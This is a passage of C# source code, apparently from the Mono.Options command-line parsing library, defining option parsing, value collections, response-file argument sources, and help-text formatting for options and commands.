IList).Add(value); }\n        bool IList.Contains(object value) { return (values as IList).Contains(value); }\n        int IList.IndexOf(object value) { return (values as IList).IndexOf(value); }\n        void IList.Insert(int index, object value) { (values as IList).Insert(index, value); }\n        void IList.Remove(object value) { (values as IList).Remove(value); }\n        void IList.RemoveAt(int index) { (values as IList).RemoveAt(index); }\n        bool IList.IsFixedSize { get { return false; } }\n        object IList.this[int index] { get { return this[index]; } set { (values as IList)[index] = value; } }\n        #endregion\n\n        #region IList<T>\n        public int IndexOf(string item) { return values.IndexOf(item); }\n        public void Insert(int index, string item) { values.Insert(index, item); }\n        public void RemoveAt(int index) { values.RemoveAt(index); }\n\n        private void AssertValid(int index) {\n            if (c.Option == null)\n                throw new InvalidOperationException(\"OptionContext.Option is null.\");\n            if (index >= c.Option.MaxValueCount)\n                throw new ArgumentOutOfRangeException(\"index\");\n            if (c.Option.OptionValueType == OptionValueType.Required &&\n                    index >= values.Count)\n                throw new OptionException(string.Format(\n                            c.OptionSet.MessageLocalizer(\"Missing required value for option '{0}'.\"), c.OptionName),\n                        c.OptionName);\n        }\n\n        public string this[int index] {\n            get {\n                AssertValid(index);\n                return index >= values.Count ? null : values[index];\n            }\n            set {\n                values[index] = value;\n            }\n        }\n        #endregion\n\n        public List<string> ToList() {\n            return new List<string>(values);\n        }\n\n        public string[] ToArray() {\n            return values.ToArray();\n        }\n\n        public override string ToString() {\n            return string.Join(\", \", values.ToArray());\n        }\n    }\n\n    public class OptionContext {\n        private Option option;\n        private string name;\n        private int index;\n        private OptionSet set;\n        private OptionValueCollection c;\n\n        public OptionContext(OptionSet set) {\n            this.set = set;\n            this.c = new OptionValueCollection(this);\n        }\n\n        public Option Option {\n            get { return option; }\n            set { option = value; }\n        }\n\n        public string OptionName {\n            get { return name; }\n            set { name = value; }\n        }\n\n        public int OptionIndex {\n            get { return index; }\n            set { index = value; }\n        }\n\n        public OptionSet OptionSet {\n            get { return set; }\n        }\n\n        public OptionValueCollection OptionValues {\n            get { return c; }\n        }\n    }\n\n    public enum OptionValueType {\n        None,\n        Optional,\n        Required,\n    }\n\n    public abstract class Option {\n        string prototype, description;\n        string[] names;\n        OptionValueType type;\n        int count;\n        string[] separators;\n        bool hidden;\n\n        protected Option(string prototype, string description)\n            : this(prototype, description, 1, false) {\n        }\n\n        protected Option(string prototype, string description, int maxValueCount)\n            : this(prototype, description, maxValueCount, false) {\n        }\n\n        protected Option(string prototype, string description, int maxValueCount, bool hidden) {\n            if (prototype == null)\n                throw new ArgumentNullException(\"prototype\");\n            if (prototype.Length == 0)\n                throw new ArgumentException(\"Cannot be the empty string.\", \"prototype\");\n            if (maxValueCount < 0)\n                throw new ArgumentOutOfRangeException(\"maxValueCount\");\n\n            this.prototype = prototype;\n            this.description = description;\n            this.count = maxValueCount;\n            this.names = (this is OptionSet.Category)\n                // append GetHashCode() so that \"duplicate\" categories have distinct\n                // names, e.g. adding multiple \"\" categories should be valid.\n                ? new[] { prototype + this.GetHashCode() }\n                : prototype.Split('|');\n\n            if (this is OptionSet.Category || this is CommandOption)\n                return;\n\n            this.type = ParsePrototype();\n            this.hidden = hidden;\n\n            if (this.count == 0 && type != OptionValueType.None)\n                throw new ArgumentException(\n                        \"Cannot provide maxValueCount of 0 for OptionValueType.Required or \" +\n                            \"OptionValueType.Optional.\",\n                        \"maxValueCount\");\n            if (this.type == OptionValueType.None && maxValueCount > 1)\n                throw new ArgumentException(\n                        string.Format(\"Cannot provide maxValueCount of {0} for OptionValueType.None.\", maxValueCount),\n                        \"maxValueCount\");\n            if (Array.IndexOf(names, \"<>\") >= 0 &&\n                    ((names.Length == 1 && this.type != OptionValueType.None) ||\n                     (names.Length > 1 && this.MaxValueCount > 1)))\n                throw new ArgumentException(\n                        \"The default option handler '<>' cannot require values.\",\n                        \"prototype\");\n        }\n\n        public string Prototype { get { return prototype; } }\n        public string Description { get { return description; } }\n        public OptionValueType OptionValueType { get { return type; } }\n        public int MaxValueCount { get { return count; } }\n        public bool Hidden { get { return hidden; } }\n\n        public string[] GetNames() {\n            return (string[])names.Clone();\n        }\n\n        public string[] GetValueSeparators() {\n            if (separators == null)\n                return new string[0];\n            return (string[])separators.Clone();\n        }\n\n        protected static T Parse<T>(string value, OptionContext c) {\n            Type tt = typeof(T);\n#if PCL\n\t\t\tTypeInfo ti = tt.GetTypeInfo ();\n#else\n            Type ti = tt;\n#endif\n            bool nullable =\n                ti.IsValueType &&\n                ti.IsGenericType &&\n                !ti.IsGenericTypeDefinition &&\n                ti.GetGenericTypeDefinition() == typeof(Nullable<>);\n#if PCL\n\t\t\tType targetType = nullable ? tt.GenericTypeArguments [0] : tt;\n#else\n            Type targetType = nullable ? tt.GetGenericArguments()[0] : tt;\n#endif\n            T t = default(T);\n            try {\n                if (value != null) {\n#if PCL\n\t\t\t\t\tif (targetType.GetTypeInfo ().IsEnum)\n\t\t\t\t\t\tt = (T) Enum.Parse (targetType, value, true);\n\t\t\t\t\telse\n\t\t\t\t\t\tt = (T) Convert.ChangeType (value, targetType);\n#else\n                    TypeConverter conv = TypeDescriptor.GetConverter(targetType);\n                    t = (T)conv.ConvertFromString(value);\n#endif\n                }\n            } catch (Exception e) {\n                throw new OptionException(\n                        string.Format(\n                            c.OptionSet.MessageLocalizer(\"Could not convert string `{0}' to type {1} for option `{2}'.\"),\n                            value, targetType.Name, c.OptionName),\n                        c.OptionName, e);\n            }\n            return t;\n        }\n\n        internal string[] Names { get { return names; } }\n        internal string[] ValueSeparators { get { return separators; } }\n\n        static readonly char[] NameTerminator = new char[] { '=', ':' };\n\n        private OptionValueType ParsePrototype() {\n            char type = '\\0';\n            List<string> seps = new List<string>();\n            for (int i = 0; i < names.Length; ++i) {\n                string name = names[i];\n                if (name.Length == 0)\n                    throw new ArgumentException(\"Empty option names are not supported.\", \"prototype\");\n\n                int end = name.IndexOfAny(NameTerminator);\n                if (end == -1)\n                    continue;\n                names[i] = name.Substring(0, end);\n                if (type == '\\0' || type == name[end])\n                    type = name[end];\n                else\n                    throw new ArgumentException(\n                            string.Format(\"Conflicting option types: '{0}' vs. '{1}'.\", type, name[end]),\n                            \"prototype\");\n                AddSeparators(name, end, seps);\n            }\n\n            if (type == '\\0')\n                return OptionValueType.None;\n\n            if (count <= 1 && seps.Count != 0)\n                throw new ArgumentException(\n                        string.Format(\"Cannot provide key/value separators for Options taking {0} value(s).\", count),\n                        \"prototype\");\n            if (count > 1) {\n                if (seps.Count == 0)\n                    this.separators = new string[] { \":\", \"=\" };\n                else if (seps.Count == 1 && seps[0].Length == 0)\n                    this.separators = null;\n                else\n                    this.separators = seps.ToArray();\n            }\n\n            return type == '=' ? OptionValueType.Required : OptionValueType.Optional;\n        }\n\n        private static void AddSeparators(string name, int end, ICollection<string> seps) {\n            int start = -1;\n            for (int i = end + 1; i < name.Length; ++i) {\n                switch (name[i]) {\n                    case '{':\n                        if (start != -1)\n                            throw new ArgumentException(\n                                    string.Format(\"Ill-formed name/value separator found in \\\"{0}\\\".\", name),\n                                    \"prototype\");\n                        start = i + 1;\n                        break;\n                    case '}':\n                        if (start == -1)\n                            throw new ArgumentException(\n                                    string.Format(\"Ill-formed name/value separator found in \\\"{0}\\\".\", name),\n                                    \"prototype\");\n                        seps.Add(name.Substring(start, i - start));\n                        start = -1;\n                        break;\n                    default:\n                        if (start == -1)\n                            seps.Add(name[i].ToString());\n                        break;\n                }\n            }\n            if (start != -1)\n                throw new ArgumentException(\n                        string.Format(\"Ill-formed name/value separator found in \\\"{0}\\\".\", name),\n                        \"prototype\");\n        }\n\n        public void Invoke(OptionContext c) {\n            OnParseComplete(c);\n            c.OptionName = null;\n            c.Option = null;\n            c.OptionValues.Clear();\n        }\n\n        protected abstract void OnParseComplete(OptionContext c);\n\n        internal void InvokeOnParseComplete(OptionContext c) {\n            OnParseComplete(c);\n        }\n\n        public override string ToString() {\n            return Prototype;\n        }\n    }\n\n    public abstract class ArgumentSource {\n\n        protected ArgumentSource() {\n        }\n\n        public abstract string[] GetNames();\n        public abstract string Description { get; }\n        public abstract bool GetArguments(string value, out IEnumerable<string> replacement);\n\n#if !PCL || NETSTANDARD1_3\n        public static IEnumerable<string> GetArgumentsFromFile(string file) {\n            return GetArguments(File.OpenText(file), true);\n        }\n#endif\n\n        public static IEnumerable<string> GetArguments(TextReader reader) {\n            return GetArguments(reader, false);\n        }\n\n        // Cribbed from mcs/driver.cs:LoadArgs(string)\n        static IEnumerable<string> GetArguments(TextReader reader, bool close) {\n            try {\n                StringBuilder arg = new StringBuilder();\n\n                string line;\n                while ((line = reader.ReadLine()) != null) {\n                    int t = line.Length;\n\n                    for (int i = 0; i < t; i++) {\n                        char c = line[i];\n\n                        if (c == '\"' || c == '\\'') {\n                            char end = c;\n\n                            for (i++; i < t; i++) {\n                                c = line[i];\n\n                                if (c == end)\n                                    break;\n                                arg.Append(c);\n                            }\n                        } else if (c == ' ') {\n                            if (arg.Length > 0) {\n                                yield return arg.ToString();\n                                arg.Length = 0;\n                            }\n                        } else\n                            arg.Append(c);\n                    }\n                    if (arg.Length > 0) {\n                        yield return arg.ToString();\n                        arg.Length = 0;\n                    }\n                }\n            } finally {\n                if (close)\n                    reader.Dispose();\n            }\n        }\n    }\n\n#if !PCL || NETSTANDARD1_3\n    internal class ResponseFileSource : ArgumentSource {\n\n        public override string[] GetNames() {\n            return new string[] { \"@file\" };\n        }\n\n        public override string Description {\n            get { return \"Read response file for more options.\"; }\n        }\n\n        public override bool GetArguments(string value, out IEnumerable<string> replacement) {\n            if (string.IsNullOrEmpty(value) || !value.StartsWith(\"@\")) {\n                replacement = null;\n                return false;\n            }\n            replacement = ArgumentSource.GetArgumentsFromFile(value.Substring(1));\n            return true;\n        }\n    }\n#endif\n\n#if !PCL\n    [Serializable]\n#endif\n    internal class OptionException : Exception {\n        private string option;\n\n        public OptionException() {\n        }\n\n        public OptionException(string message, string optionName)\n            : base(message) {\n            this.option = optionName;\n        }\n\n        public OptionException(string message, string optionName, Exception innerException)\n            : base(message, innerException) {\n            this.option = optionName;\n        }\n\n#if !PCL\n        protected OptionException(SerializationInfo info, StreamingContext context)\n            : base(info, context) {\n            this.option = info.GetString(\"OptionName\");\n        }\n#endif\n\n        public string OptionName {\n            get { return this.option; }\n        }\n\n#if !PCL\n#pragma warning disable 618 // SecurityPermissionAttribute is obsolete\n        [SecurityPermission(SecurityAction.LinkDemand, SerializationFormatter = true)]\n#pragma warning restore 618\n        public override void GetObjectData(SerializationInfo info, StreamingContext context) {\n            base.GetObjectData(info, context);\n            info.AddValue(\"OptionName\", option);\n        }\n#endif\n    }\n\n    public delegate void OptionAction<TKey, TValue>(TKey key, TValue value);\n\n    public class OptionSet : KeyedCollection<string, Option> {\n        public OptionSet()\n            : this(null) {\n        }\n\n        public OptionSet(MessageLocalizerConverter localizer) {\n            this.roSources = new ReadOnlyCollection<ArgumentSource>(sources);\n            this.localizer = localizer;\n            if (this.localizer == null) {\n                this.localizer = delegate (string f) {\n                    return f;\n                };\n            }\n        }\n\n        MessageLocalizerConverter localizer;\n\n        public MessageLocalizerConverter MessageLocalizer {\n            get { return localizer; }\n            internal set { localizer = value; }\n        }\n\n        List<ArgumentSource> sources = new List<ArgumentSource>();\n        ReadOnlyCollection<ArgumentSource> roSources;\n\n        public ReadOnlyCollection<ArgumentSource> ArgumentSources {\n            get { return roSources; }\n        }\n\n\n        protected override string GetKeyForItem(Option item) {\n            if (item == null)\n                throw new ArgumentNullException(\"option\");\n            if (item.Names != null && item.Names.Length > 0)\n                return item.Names[0];\n            // This should never happen, as it's invalid for Option to be\n            // constructed w/o any names.\n            throw new InvalidOperationException(\"Option has no names!\");\n        }\n\n        [Obsolete(\"Use KeyedCollection.this[string]\")]\n        protected Option GetOptionForName(string option) {\n            if (option == null)\n                throw new ArgumentNullException(\"option\");\n            try {\n                return base[option];\n            } catch (KeyNotFoundException) {\n                return null;\n            }\n        }\n\n        protected override void InsertItem(int index, Option item) {\n            base.InsertItem(index, item);\n            AddImpl(item);\n        }\n\n        protected override void RemoveItem(int index) {\n            Option p = Items[index];\n            base.RemoveItem(index);\n            // KeyedCollection.RemoveItem() handles the 0th item\n            for (int i = 1; i < p.Names.Length; ++i) {\n                Dictionary.Remove(p.Names[i]);\n            }\n        }\n\n        protected override void SetItem(int index, Option item) {\n            base.SetItem(index, item);\n            AddImpl(item);\n        }\n\n        private void AddImpl(Option option) {\n            if (option == null)\n                throw new ArgumentNullException(\"option\");\n            List<string> added = new List<string>(option.Names.Length);\n            try {\n                // KeyedCollection.InsertItem/SetItem handle the 0th name.\n                for (int i = 1; i < option.Names.Length; ++i) {\n                    Dictionary.Add(option.Names[i], option);\n                    added.Add(option.Names[i]);\n                }\n            } catch (Exception) {\n                foreach (string name in added)\n                    Dictionary.Remove(name);\n                throw;\n            }\n        }\n\n        public OptionSet Add(string header) {\n            if (header == null)\n                throw new ArgumentNullException(\"header\");\n            Add(new Category(header));\n            return this;\n        }\n\n        internal sealed class Category : Option {\n\n            // Prototype starts with '=' because this is an invalid prototype\n            // (see Option.ParsePrototype(), and thus it'll prevent Category\n            // instances from being accidentally used as normal options.\n            public Category(string description)\n                : base(\"=:Category:= \" + description, description) {\n            }\n\n            protected override void OnParseComplete(OptionContext c) {\n                throw new NotSupportedException(\"Category.OnParseComplete should not be invoked.\");\n            }\n        }\n\n\n        public new OptionSet Add(Option option) {\n            base.Add(option);\n            return this;\n        }\n\n        sealed class ActionOption : Option {\n            Action<OptionValueCollection> action;\n\n            public ActionOption(string prototype, string description, int count, Action<OptionValueCollection> action)\n                : this(prototype, description, count, action, false) {\n            }\n\n            public ActionOption(string prototype, string description, int count, Action<OptionValueCollection> action, bool hidden)\n                : base(prototype, description, count, hidden) {\n                if (action == null)\n                    throw new ArgumentNullException(\"action\");\n                this.action = action;\n            }\n\n            protected override void OnParseComplete(OptionContext c) {\n                action(c.OptionValues);\n            }\n        }\n\n        public OptionSet Add(string prototype, Action<string> action) {\n            return Add(prototype, null, action);\n        }\n\n        public OptionSet Add(string prototype, string description, Action<string> action) {\n            return Add(prototype, description, action, false);\n        }\n\n        public OptionSet Add(string prototype, string description, Action<string> action, bool hidden) {\n            if (action == null)\n                throw new ArgumentNullException(\"action\");\n            Option p = new ActionOption(prototype, description, 1,\n                    delegate (OptionValueCollection v) { action(v[0]); }, hidden);\n            base.Add(p);\n            return this;\n        }\n\n        public OptionSet Add(string prototype, OptionAction<string, string> action) {\n            return Add(prototype, null, action);\n        }\n\n        public OptionSet Add(string prototype, string description, OptionAction<string, string> action) {\n            return Add(prototype, description, action, false);\n        }\n\n        public OptionSet Add(string prototype, string description, OptionAction<string, string> action, bool hidden) {\n            if (action == null)\n                throw new ArgumentNullException(\"action\");\n            Option p = new ActionOption(prototype, description, 2,\n                    delegate (OptionValueCollection v) { action(v[0], v[1]); }, hidden);\n            base.Add(p);\n            return this;\n        }\n\n        sealed class ActionOption<T> : Option {\n            Action<T> action;\n\n            public ActionOption(string prototype, string description, Action<T> action)\n                : base(prototype, description, 1) {\n                if (action == null)\n                    throw new ArgumentNullException(\"action\");\n                this.action = action;\n            }\n\n            protected override void OnParseComplete(OptionContext c) {\n                action(Parse<T>(c.OptionValues[0], c));\n            }\n        }\n\n        sealed class ActionOption<TKey, TValue> : Option {\n            OptionAction<TKey, TValue> action;\n\n            public ActionOption(string prototype, string description, OptionAction<TKey, TValue> action)\n                : base(prototype, description, 2) {\n                if (action == null)\n                    throw new ArgumentNullException(\"action\");\n                this.action = action;\n            }\n\n            protected override void OnParseComplete(OptionContext c) {\n                action(\n                        Parse<TKey>(c.OptionValues[0], c),\n                        Parse<TValue>(c.OptionValues[1], c));\n            }\n        }\n\n        public OptionSet Add<T>(string prototype, Action<T> action) {\n            return Add(prototype, null, action);\n        }\n\n        public OptionSet Add<T>(string prototype, string description, Action<T> action) {\n            return Add(new ActionOption<T>(prototype, description, action));\n        }\n\n        public OptionSet Add<TKey, TValue>(string prototype, OptionAction<TKey, TValue> action) {\n            return Add(prototype, null, action);\n        }\n\n        public OptionSet Add<TKey, TValue>(string prototype, string description, OptionAction<TKey, TValue> action) {\n            return Add(new ActionOption<TKey, TValue>(prototype, description, action));\n        }\n\n        public OptionSet Add(ArgumentSource source) {\n            if (source == null)\n                throw new ArgumentNullException(\"source\");\n            sources.Add(source);\n            return this;\n        }\n\n        protected virtual OptionContext CreateOptionContext() {\n            return new OptionContext(this);\n        }\n\n        public List<string> Parse(IEnumerable<string> arguments) {\n            if (arguments == null)\n                throw new ArgumentNullException(\"arguments\");\n            OptionContext c = CreateOptionContext();\n            c.OptionIndex = -1;\n            bool process = true;\n            List<string> unprocessed = new List<string>();\n            Option def = Contains(\"<>\") ? this[\"<>\"] : null;\n            ArgumentEnumerator ae = new ArgumentEnumerator(arguments);\n            foreach (string argument in ae) {\n                ++c.OptionIndex;\n                if (argument == \"--\") {\n                    process = false;\n                    continue;\n                }\n                if (!process) {\n                    Unprocessed(unprocessed, def, c, argument);\n                    continue;\n                }\n                if (AddSource(ae, argument))\n                    continue;\n                if (!Parse(argument, c))\n                    Unprocessed(unprocessed, def, c, argument);\n            }\n            if (c.Option != null)\n                c.Option.Invoke(c);\n            return unprocessed;\n        }\n\n        class ArgumentEnumerator : IEnumerable<string> {\n            List<IEnumerator<string>> sources = new List<IEnumerator<string>>();\n\n            public ArgumentEnumerator(IEnumerable<string> arguments) {\n                sources.Add(arguments.GetEnumerator());\n            }\n\n            public void Add(IEnumerable<string> arguments) {\n                sources.Add(arguments.GetEnumerator());\n            }\n\n            public IEnumerator<string> GetEnumerator() {\n                do {\n                    IEnumerator<string> c = sources[sources.Count - 1];\n                    if (c.MoveNext())\n                        yield return c.Current;\n                    else {\n                        c.Dispose();\n                        sources.RemoveAt(sources.Count - 1);\n                    }\n                } while (sources.Count > 0);\n            }\n\n            IEnumerator IEnumerable.GetEnumerator() {\n                return GetEnumerator();\n            }\n        }\n\n        bool AddSource(ArgumentEnumerator ae, string argument) {\n            foreach (ArgumentSource source in sources) {\n                IEnumerable<string> replacement;\n                if (!source.GetArguments(argument, out replacement))\n                    continue;\n                ae.Add(replacement);\n                return true;\n            }\n            return false;\n        }\n\n        private static bool Unprocessed(ICollection<string> extra, Option def, OptionContext c, string argument) {\n            if (def == null) {\n                extra.Add(argument);\n                return false;\n            }\n            c.OptionValues.Add(argument);\n            c.Option = def;\n            c.Option.Invoke(c);\n            return false;\n        }\n\n        private readonly Regex ValueOption = new Regex(\n            @\"^(?<flag>--|-|/)(?<name>[^:=]+)((?<sep>[:=])(?<value>.*))?$\");\n\n        protected bool GetOptionParts(string argument, out string flag, out string name, out string sep, out string value) {\n            if (argument == null)\n                throw new ArgumentNullException(\"argument\");\n\n            flag = name = sep = value = null;\n            Match m = ValueOption.Match(argument);\n            if (!m.Success) {\n                return false;\n            }\n            flag = m.Groups[\"flag\"].Value;\n            name = m.Groups[\"name\"].Value;\n            if (m.Groups[\"sep\"].Success && m.Groups[\"value\"].Success) {\n                sep = m.Groups[\"sep\"].Value;\n                value = m.Groups[\"value\"].Value;\n            }\n            return true;\n        }\n\n        protected virtual bool Parse(string argument, OptionContext c) {\n            if (c.Option != null) {\n                ParseValue(argument, c);\n                return true;\n            }\n\n            string f, n, s, v;\n            if (!GetOptionParts(argument, out f, out n, out s, out v))\n                return false;\n\n            Option p;\n            if (Contains(n)) {\n                p = this[n];\n                c.OptionName = f + n;\n                c.Option = p;\n                switch (p.OptionValueType) {\n                    case OptionValueType.None:\n                        c.OptionValues.Add(n);\n                        c.Option.Invoke(c);\n                        break;\n                    case OptionValueType.Optional:\n                    case OptionValueType.Required:\n                        ParseValue(v, c);\n                        break;\n                }\n                return true;\n            }\n            // no match; is it a bool option?\n            if (ParseBool(argument, n, c))\n                return true;\n            // is it a bundled option?\n            if (ParseBundledValue(f, string.Concat(n + s + v), c))\n                return true;\n\n            return false;\n        }\n\n        private void ParseValue(string option, OptionContext c) {\n            if (option != null)\n                foreach (string o in c.Option.ValueSeparators != null\n                        ? option.Split(c.Option.ValueSeparators, c.Option.MaxValueCount - c.OptionValues.Count, StringSplitOptions.None)\n                        : new string[] { option }) {\n                    c.OptionValues.Add(o);\n                }\n            if (c.OptionValues.Count == c.Option.MaxValueCount ||\n                    c.Option.OptionValueType == OptionValueType.Optional)\n                c.Option.Invoke(c);\n            else if (c.OptionValues.Count > c.Option.MaxValueCount) {\n                throw new OptionException(localizer(string.Format(\n                                \"Error: Found {0} option values when expecting {1}.\",\n                                c.OptionValues.Count, c.Option.MaxValueCount)),\n                        c.OptionName);\n            }\n        }\n\n        private bool ParseBool(string option, string n, OptionContext c) {\n            Option p;\n            string rn;\n            if (n.Length >= 1 && (n[n.Length - 1] == '+' || n[n.Length - 1] == '-') &&\n                    Contains((rn = n.Substring(0, n.Length - 1)))) {\n                p = this[rn];\n                string v = n[n.Length - 1] == '+' ? option : null;\n                c.OptionName = option;\n                c.Option = p;\n                c.OptionValues.Add(v);\n                p.Invoke(c);\n                return true;\n            }\n            return false;\n        }\n\n        private bool ParseBundledValue(string f, string n, OptionContext c) {\n            if (f != \"-\")\n                return false;\n            for (int i = 0; i < n.Length; ++i) {\n                Option p;\n                string opt = f + n[i].ToString();\n                string rn = n[i].ToString();\n                if (!Contains(rn)) {\n                    if (i == 0)\n                        return false;\n                    throw new OptionException(string.Format(localizer(\n                                    \"Cannot use unregistered option '{0}' in bundle '{1}'.\"), rn, f + n), null);\n                }\n                p = this[rn];\n                switch (p.OptionValueType) {\n                    case OptionValueType.None:\n                        Invoke(c, opt, n, p);\n                        break;\n                    case OptionValueType.Optional:\n                    case OptionValueType.Required: {\n                            string v = n.Substring(i + 1);\n                            c.Option = p;\n                            c.OptionName = opt;\n                            ParseValue(v.Length != 0 ? v : null, c);\n                            return true;\n                        }\n                    default:\n                        throw new InvalidOperationException(\"Unknown OptionValueType: \" + p.OptionValueType);\n                }\n            }\n            return true;\n        }\n\n        private static void Invoke(OptionContext c, string name, string value, Option option) {\n            c.OptionName = name;\n            c.Option = option;\n            c.OptionValues.Add(value);\n            option.Invoke(c);\n        }\n\n        private const int OptionWidth = 29;\n        private const int Description_FirstWidth = 80 - OptionWidth;\n        private const int Description_RemWidth = 80 - OptionWidth - 2;\n\n        static readonly string CommandHelpIndentStart = new string(' ', OptionWidth);\n        static readonly string CommandHelpIndentRemaining = new string(' ', OptionWidth + 2);\n\n        public void WriteOptionDescriptions(TextWriter o) {\n            foreach (Option p in this) {\n                int written = 0;\n\n                if (p.Hidden)\n                    continue;\n\n                Category c = p as Category;\n                if (c != null) {\n                    WriteDescription(o, p.Description, \"\", 80, 80);\n                    continue;\n                }\n                CommandOption co = p as CommandOption;\n                if (co != null) {\n                    WriteCommandDescription(o, co.Command, co.CommandName);\n                    continue;\n                }\n\n                if (!WriteOptionPrototype(o, p, ref written))\n                    continue;\n\n                if (written < OptionWidth)\n                    o.Write(new string(' ', OptionWidth - written));\n                else {\n                    o.WriteLine();\n                    o.Write(new string(' ', OptionWidth));\n                }\n\n                WriteDescription(o, p.Description, new string(' ', OptionWidth + 2),\n                        Description_FirstWidth, Description_RemWidth);\n            }\n\n            foreach (ArgumentSource s in sources) {\n                string[] names = s.GetNames();\n                if (names == null || names.Length == 0)\n                    continue;\n\n                int written = 0;\n\n                Write(o, ref written, \"  \");\n                Write(o, ref written, names[0]);\n                for (int i = 1; i < names.Length; ++i) {\n                    Write(o, ref written, \", \");\n                    Write(o, ref written, names[i]);\n                }\n\n                if (written < OptionWidth)\n                    o.Write(new string(' ', OptionWidth - written));\n                else {\n                    o.WriteLine();\n                    o.Write(new string(' ', OptionWidth));\n                }\n\n                WriteDescription(o, s.Description, new string(' ', OptionWidth + 2),\n                        Description_FirstWidth, Description_RemWidth);\n            }\n        }\n\n        internal void WriteCommandDescription(TextWriter o, Command c, string commandName) {\n            var name = new string(' ', 8) + (commandName ?? c.Name);\n            if (name.Length < OptionWidth - 1) {\n                WriteDescription(o, name + new string(' ', OptionWidth - name.Length) + c.Help, CommandHelpIndentRemaining, 80, Description_RemWidth);\n            } else {\n                WriteDescription(o, name, \"\", 80, 80);\n                WriteDescription(o, CommandHelpIndentStart + c.Help, CommandHelpIndentRemaining, 80, Description_RemWidth);\n            }\n        }\n\n        void WriteDescription(TextWriter o, string value, string prefix, int firstWidth, int remWidth) {\n            bool indent = false;\n            foreach (string line in GetLines(localizer(GetDescription(value)), firstWidth, remWidth)) {\n                if (indent)\n                    o.Write(prefix);\n                o.WriteLine(line);\n                indent = true;\n            }\n        }\n\n        bool WriteOptionPrototype(TextWriter o, Option p, ref int written) {\n            string[] names = p.Names;\n\n            int i = GetNextOptionIndex(names, 0);\n            if (i == names.Length)\n                return false;\n\n            if (names[i].Length == 1) {\n                Write(o, ref written, \"  -\");\n                Write(o, ref written, names[0]);\n            } else {\n                Write(o, ref written, \"      --\");\n                Write(o, ref written, names[0]);\n            }\n\n            for (i = GetNextOptionIndex(names, i + 1);\n                    i < names.Length; i = GetNextOptionIndex(names, i + 1)) {\n                Write(o, ref written, \", \");\n                Write(o, ref written, names[i].Length == 1 ? \"-\" : \"--\");\n                Write(o, ref written, names[i]);\n            }\n\n            if (p.OptionValueType == OptionValueType.Optional ||\n                    p.OptionValueType == OptionValueType.Required) {\n                if (p.OptionValueType == OptionValueType.Optional) {\n                    Write(o, ref written, localizer(\"[\"));\n                }\n                Write(o, ref written, localizer(\"=\" + GetArgumentName(0, p.MaxValueCount, p.Description)));\n                string sep = p.ValueSeparators != null && p.ValueSeparators.Length > 0\n                    ? p.ValueSeparators[0]\n                    : \" \";\n                for (int c = 1; c < p.MaxValueCount; ++c) {\n                    Write(o, ref written, localizer(sep + GetArgumentName(c, p.MaxValueCount, p.Description)));\n                }\n                if (p.OptionValueType == OptionValueType.Optional) {\n                    Write(o, ref written, localizer(\"]\"));\n                }\n            }\n            return true;\n        }\n\n        static int GetNextOptionIndex(string[] names, int i) {\n            while (i < names.Length && names[i] == \"<>\") {\n                ++i;\n            }\n            return i;\n        }\n\n        static void Write(TextWriter o, ref int n, string s) {\n            n += s.Length;\n            o.Write(s);\n        }\n\n        static string GetArgumentName(int index, int maxIndex, string description) {\n            var matches = Regex.Matches(description ?? \"\", @\"(?<=(?<!\\{)\\{)[^{}]*(?=\\}(?!\\}))\"); // ignore double braces \n            string argName = \"\";\n            foreach (Match match in matches) {\n                var parts = match.Value.Split(':');\n                // for maxIndex=1 it can be {foo} or {0:foo}\n                if (maxIndex == 1) {\n                    argName = parts[parts.Length - 1];\n                }\n                // look for {i:foo} if maxIndex > 1\n                if (maxIndex > 1 && parts.Length == 2 &&\n                    parts[0] == index.ToString(CultureInfo.InvariantCulture)) {\n                    argName = parts[1];\n                }\n            }\n\n            if (string.IsNullOrEmpty(argName)) {\n                argName = maxIndex == 1 ? \"VALUE\" : \"VALUE\" + (index + 1);\n            }\n            return argName;\n        }\n\n        private static string GetDescription(string description) {\n            if (description == null)\n                return string.Empty;\n            StringBuilder sb = new StringBuilder(description.Length);\n            int start = -1;\n            for (int i = 0; i < description.Length; ++i) {\n                switch (description[i]) {\n                    case '{':\n                        if (i == start) {\n                            sb.Append('{');\n                            start = -1;\n                        } else if (start < 0)\n                            start = i + 1;\n                        break;\n                    case '}':\n                        if (start < 0) {\n                            if ((i + 1) == description.Length || description[i + 1] != '}')\n                                throw new InvalidOperationException(\"Invalid option description: \" + description);\n                            ++i;\n                            sb.Append(\"}\");\n                        } else {\n                            sb.Append(description.Substring(start, i - start));\n                            start = -1;\n                        }\n                        break;\n                    case ':':\n                        if (start < 0)\n                            goto default;\n                        start = i + 1;\n                        break;\n                    default:\n                        if (start < 0)\n                            sb.Append(description[i]);\n                        break;\n                }\n            }\n            return sb.ToString();\n        }\n\n        private static IEnumerable<string> GetLines(string description, int firstWidth, int remWidth) {\n            return StringCoda.WrappedLines(description, firstWidth, remWidth);\n        }\n    }\n\n    internal class Command {\n        public string Name { get; }\n        public string Help { get; }\n\n        public OptionSet Options { get; set; }\n        public Action<IEnumerable<string>> Run { get; set; }\n\n        public CommandSet CommandSet { get; internal set; }\n\n        public Command(string name, string help = null) {\n            if (string.IsNullOrEmpty(name))\n                throw new ArgumentNullException(nameof(name));\n\n            Name = NormalizeCommandName(name);\n            Help = help;\n        }\n\n        static string NormalizeCommandName(string name) {\n            var value = new StringBuilder(name.Length);\n            var space = false;\n            for (int i = 0; i < name.Length; ++i) {\n                if (!char.IsWhiteSpace(name, i)) {\n                    space = false;\n                    value.Append(name[i]);\n                } else if (!space) {\n                    space = true;\n                    value.Append(' ');\n                }\n            }\n            return value.ToString();\n        }\n\n        public virtual int Invoke(IEnumerable<string> arguments) {\n            var rest = Options?.Parse(arguments) ?? arguments;\n            Run?.Invoke(rest);\n            return 0;\n        }\n    }\n\n    class CommandOption : Option {\n        public Command Command { get; }\n        public string CommandName { get; }\n\n        // Prototype starts with '=' because this is an invalid prototype\n        // (see Option.ParsePrototype(), and thus it'll prevent Category\n        // instances from being accidentally used as normal options.\n        public CommandOption(Command command, string commandName = null, bool hidden = false)\n            : base(\"=:Command:= \" + (commandName ?? command?.Name), (commandName ?? command?.Name), maxValueCount: 0, hidden: hidden) {\n            if (command == null)\n                throw new ArgumentNullException(nameof(command));\n            Command = command;\n            CommandName = commandName ?? command.Name;\n        }\n\n        protected override void OnParseComplete(OptionContext c) {\n            throw new NotSupportedException(\"CommandOption.OnParseComplete should not be invoked.\");\n        }\n    }\n\n    class HelpOption : Option {\n        Option option;\n        CommandSet commands;\n\n        public HelpOption(CommandSet commands, Option d)\n            : base(d.Prototype, d.Description, d.MaxValueCount, d.Hidden) {\n            this.commands = commands;\n            this.option = d;\n        }\n\n        protected override void 